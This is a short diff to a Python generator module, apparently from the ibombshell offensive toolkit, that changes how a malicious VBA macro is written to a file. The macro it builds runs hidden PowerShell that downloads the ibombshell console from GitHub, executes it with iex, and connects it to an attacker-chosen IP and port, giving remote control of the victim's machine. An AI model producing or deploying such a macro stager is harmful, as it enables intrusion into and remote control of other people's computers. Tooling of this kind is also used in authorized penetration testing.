@@ -18,8 +18,5 @@ class CustomModule(ModuleGenerate):
         code = ("""Sub launchIBombShell()
      Shell ('powershell.exe -noexit -W Hidden ' & '(iwr -UseBasicParsing -uri "https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console").Content | iex; console -Silently -uriConsole http://{}:{}')
 End Sub""".format(self.args['ip'], self.args['port']))
-        if self.args["output"] and (not self.args["output"].endswith(".bas")):
-                self.args["output"] = self.args["output"] + ".bas"
         
-        self.run(code, self.args["output"])
-        
+        self.run(code, "bas")
